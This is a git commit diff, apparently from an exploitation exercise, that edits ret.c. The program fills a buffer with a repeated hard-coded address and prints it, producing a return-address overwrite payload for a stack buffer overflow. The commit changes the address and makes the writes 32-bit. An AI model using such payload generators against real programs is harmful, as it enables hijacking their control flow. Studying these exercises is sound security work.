0f652fb2cab2d1e474e41c245f30fd7395ef30b3
Artur Hallmann <a.hallmann@neusta.de>
2015-12-28 22:19:30 +0100

    fix for ret.c

--- readme/ret.c
+++ readme/ret.c
@@ -1,9 +1,11 @@
 #include <stdio.h>
+#include <stdint.h>
 
 int main() {
-    printf("hallo?");
     int i=0; char buf[44];
-    for (i=0;i<=40;i+=4)
-    *(long *) &buf[i] = 0x80484cb;
+    for (i=0;i<=40;i+=4) {
+        *(uint32_t *) &buf[i] = 0x400590;
+    }
     puts(buf);
+    return 0;
 }
